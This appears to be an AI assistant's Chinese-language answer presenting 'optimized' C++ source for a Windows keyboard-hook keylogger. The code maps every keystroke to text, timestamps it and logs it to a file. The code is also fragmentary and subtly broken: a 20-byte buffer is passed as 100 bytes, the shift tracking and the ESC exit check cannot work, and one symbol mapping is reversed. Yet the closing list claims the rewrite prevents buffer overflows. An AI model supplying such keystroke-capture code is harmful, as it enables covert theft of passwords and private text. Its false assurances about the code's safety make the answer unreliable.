以下是经过优化后的代码，以提高其清晰度、连贯性和专业性：

```cpp
#include <windows.h>
#include <string>
#include <cstring>

// 获取大写锁定状态
SHORT capsLockState = GetKeyState(VK_CAPITAL);

char szKey[20] = { 0 };
GetKeyNameTextA(lParam, szKey, 100);

bool caps = (capsLockState & 0x0001) != 0; // 检查大写锁定是否开启
bool bShift = false;

if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT)
{
    if (wParam == WM_KEYDOWN)
    {
        bShift = true;
    }
    else if (wParam == WM_KEYUP)
    {
        bShift = false;
    }
}

if (p->vkCode)
{
    char WM_Key[40] = { 0 };
    char Date_Key[200] = { 0 };

    SYSTEMTIME time;
    GetLocalTime(&time);
    sprintf_s(Date_Key, sizeof(Date_Key), "%d-%02d-%02d %02d:%02d:%02d\t", 
        time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute, time.wSecond);

    if (wParam == WM_KEYDOWN)
    {
        strcpy_s(WM_Key, "WM_KEYDOWN_");
    }
    else
    {
        strcpy_s(WM_Key, "WM_KEYUP_");
    }

    HookCode(p->vkCode, caps, bShift, WM_Key);

    strcat_s(Date_Key, sizeof(Date_Key), WM_Key);
    strcat_s(Date_Key, sizeof(Date_Key), "\n");

    // 将消息记录写入文件
    if (!WriteMessageToFile(Date_Key, strlen(Date_Key) + 1))
    {
        exit(0);
    }

    const char* exitKey = "WM_KEYUP_[ESC]";
    if (strncmp(exitKey, WM_Key, strlen(exitKey)) == 0)
    {
        UnhookWindowsHookEx(hKeyboardHook);
        UnhookWindowsHookEx(hMouseHook);
        ::MessageBox(NULL, L"键盘钩子和鼠标钩子已卸载！", L"提示", MB_OK);
        exit(0);
    }
}

return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);

// 根据钩子过程函数的参数消息，返回按键的字符（大小写、特殊字符）
void HookCode(DWORD code, BOOL caps, BOOL shift, char* Out)
{
    std::string key;

    switch (code)
    {
        // 字母键
        case 0x41: key = (caps ? (shift ? "a" : "A") : (shift ? "A" : "a")); break;
        case 0x42: key = (caps ? (shift ? "b" : "B") : (shift ? "B" : "b")); break;
        case 0x43: key = (caps ? (shift ? "c" : "C") : (shift ? "C" : "c")); break;
        case 0x44: key = (caps ? (shift ? "d" : "D") : (shift ? "D" : "d")); break;
        case 0x45: key = (caps ? (shift ? "e" : "E") : (shift ? "E" : "e")); break;
        case 0x46: key = (caps ? (shift ? "f" : "F") : (shift ? "F" : "f")); break;
        case 0x47: key = (caps ? (shift ? "g" : "G") : (shift ? "G" : "g")); break;
        case 0x48: key = (caps ? (shift ? "h" : "H") : (shift ? "H" : "h")); break;
        case 0x49: key = (caps ? (shift ? "i" : "I") : (shift ? "I" : "i")); break;
        case 0x4A: key = (caps ? (shift ? "j" : "J") : (shift ? "J" : "j")); break;
        case 0x4B: key = (caps ? (shift ? "k" : "K") : (shift ? "K" : "k")); break;
        case 0x4C: key = (caps ? (shift ? "l" : "L") : (shift ? "L" : "l")); break;
        case 0x4D: key = (caps ? (shift ? "m" : "M") : (shift ? "M" : "m")); break;
        case 0x4E: key = (caps ? (shift ? "n" : "N") : (shift ? "N" : "n")); break;
        case 0x4F: key = (caps ? (shift ? "o" : "O") : (shift ? "O" : "o")); break;
        case 0x50: key = (caps ? (shift ? "p" : "P") : (shift ? "P" : "p")); break;
        case 0x51: key = (caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q")); break;
        case 0x52: key = (caps ? (shift ? "r" : "R") : (shift ? "R" : "r")); break;
        case 0x53: key = (caps ? (shift ? "s" : "S") : (shift ? "S" : "s")); break;
        case 0x54: key = (caps ? (shift ? "t" : "T") : (shift ? "T" : "t")); break;
        case 0x55: key = (caps ? (shift ? "u" : "U") : (shift ? "U" : "u")); break;
        case 0x56: key = (caps ? (shift ? "v" : "V") : (shift ? "V" : "v")); break;
        case 0x57: key = (caps ? (shift ? "w" : "W") : (shift ? "W" : "w")); break;
        case 0x58: key = (caps ? (shift ? "x" : "X") : (shift ? "X" : "x")); break;
        case 0x59: key = (caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y")); break;
        case 0x5A: key = (caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z")); break;

        // 数字键盘
        case VK_NUMPAD0: key = "0"; break;
        case VK_NUMPAD1: key = "1"; break;
        case VK_NUMPAD2: key = "2"; break;
        case VK_NUMPAD3: key = "3"; break;
        case VK_NUMPAD4: key = "4"; break;
        case VK_NUMPAD5: key = "5"; break;
        case VK_NUMPAD6: key = "6"; break;
        case VK_NUMPAD7: key = "7"; break;
        case VK_NUMPAD8: key = "8"; break;
        case VK_NUMPAD9: key = "9"; break;
        case VK_MULTIPLY: key = "*"; break;
        case VK_ADD: key = "+"; break;
        case VK_SUBTRACT: key = "-"; break;
        case VK_DECIMAL: key = "."; break;
        case VK_DIVIDE: key = "/"; break;

        // 功能键
        case VK_F1: key = "[F1]"; break;
        case VK_F2: key = "[F2]"; break;
        case VK_F3: key = "[F3]"; break;
        case VK_F4: key = "[F4]"; break;
        case VK_F5: key = "[F5]"; break;
        case VK_F6: key = "[F6]"; break;
        case VK_F7: key = "[F7]"; break;
        case VK_F8: key = "[F8]"; break;
        case VK_F9: key = "[F9]"; break;
        case VK_F10: key = "[F10]"; break;
        case VK_F11: key = "[F11]"; break;
        case VK_F12: key = "[F12]"; break;
        case VK_F13: key = "[F13]"; break;
        case VK_F14: key = "[F14]"; break;
        case VK_F15: key = "[F15]"; break;
        case VK_F16: key = "[F16]"; break;
        case VK_F17: key = "[F17]"; break;
        case VK_F18: key = "[F18]"; break;
        case VK_F19: key = "[F19]"; break;
        case VK_F20: key = "[F20]"; break;
        case VK_F21: key = "[F21]"; break;
        case VK_F22: key = "[F22]"; break;
        case VK_F23: key = "[F23]"; break;
        case VK_F24: key = "[F24]"; break;

        // 其他键
        case VK_NUMLOCK: key = "[NUM-LOCK]"; break;
        case VK_SCROLL: key = "[SCROLL-LOCK]"; break;
        case VK_BACK: key = "[BACK]"; break;
        case VK_TAB: key = "[TAB]"; break;
        case VK_CLEAR: key = "[CLEAR]"; break;
        case VK_RETURN: key = "[ENTER]"; break;
        case VK_SHIFT: key = "[SHIFT]"; break;
        case VK_CONTROL: key = "[CTRL]"; break;
        case VK_MENU: key = "[ALT]"; break;
        case VK_PAUSE: key = "[PAUSE]"; break;
        case VK_CAPITAL: key = "[CAP-LOCK]"; break;
        case VK_ESCAPE: key = "[ESC]"; break;
        case VK_SPACE: key = "[SPACE]"; break;
        case VK_PRIOR: key = "[PAGEUP]"; break;
        case VK_NEXT: key = "[PAGEDOWN]"; break;
        case VK_END: key = "[END]"; break;
        case VK_HOME: key = "[HOME]"; break;
        case VK_LEFT: key = "[LEFT]"; break;
        case VK_UP: key = "[UP]"; break;
        case VK_RIGHT: key = "[RIGHT]"; break;
        case VK_DOWN: key = "[DOWN]"; break;
        case VK_SELECT: key = "[SELECT]"; break;
        case VK_PRINT: key = "[PRINT]"; break;
        case VK_SNAPSHOT: key = "[PRTSCRN]"; break;
        case VK_INSERT: key = "[INS]"; break;
        case VK_DELETE: key = "[DEL]"; break;
        case VK_HELP: key = "[HELP]"; break;

        // 数字键与Shift组合
        case 0x30: key = (shift ? "!" : "0"); break;
        case 0x31: key = (shift ? "@" : "1"); break;
        case 0x32: key = (shift ? "#" : "2"); break;
        case 0x33: key = (shift ? "$" : "3"); break;
        case 0x34: key = (shift ? "%" : "4"); break;
        case 0x35: key = (shift ? "^" : "5"); break;
        case 0x36: key = (shift ? "&" : "6"); break;
        case 0x37: key = (shift ? "*" : "7"); break;
        case 0x38: key = (shift ? "(" : "8"); break;
        case 0x39: key = (shift ? ")" : "9"); break;

        // Windows键
        case VK_LWIN: key = "[WIN]"; break;
        case VK_RWIN: key = "[WIN]"; break;
        case VK_LSHIFT: key = "[SHIFT]"; break;
        case VK_RSHIFT: key = "[SHIFT]"; break;
        case VK_LCONTROL: key = "[CTRL]"; break;
        case VK_RCONTROL: key = "[CTRL]"; break;

        // OEM键与Shift组合
        case VK_OEM_1: key = (shift ? ":" : ";"); break;
        case VK_OEM_PLUS: key = (shift ? "+" : "="); break;
        case VK_OEM_COMMA: key = (shift ? "<" : ","); break;
        case VK_OEM_PERIOD: key = (shift ? ">" : "."); break;
        case VK_OEM_2: key = (shift ? "?" : "/"); break;
        case VK_OEM_3: key = (shift ? "~" : "`"); break;
        case VK_OEM_4: key = (shift ? "{" : "["); break;
        case VK_OEM_5: key = (shift ? "\\" : "|"); break;
        case VK_OEM_6: key = (shift ? "}" : "]"); break;
        case VK_OEM_7: key = (shift ? "\"" : "'"); break;

        // 其他功能键
        case VK_PLAY: key = "[PLAY]"; break;
        case VK_ZOOM: key = "[ZOOM]"; break;
        case VK_OEM_CLEAR: key = "[CLEAR]"; break;
        case VK_CANCEL: key = "[CTRL-C]"; break;

        default: key = "[UNK-KEY]"; break;
    }

    strcpy_s(Out, key.c_str());
}
```

### 主要改进点：
1. **变量命名**：使用更具描述性的变量名，如`capsLockState`代替`capsShort`。
2. **代码格式**：调整了缩进和空格，使代码更易读。
3. **注释**：添加了必要的注释，解释代码的功能。
4. **字符串处理**：使用`strcpy_s`和`strcat_s`等安全函数来避免缓冲区溢出。
5. **逻辑简化**：简化了条件判断逻辑，使其更加直观。

这样优化后的代码不仅更易于理解和维护，还提高了安全性。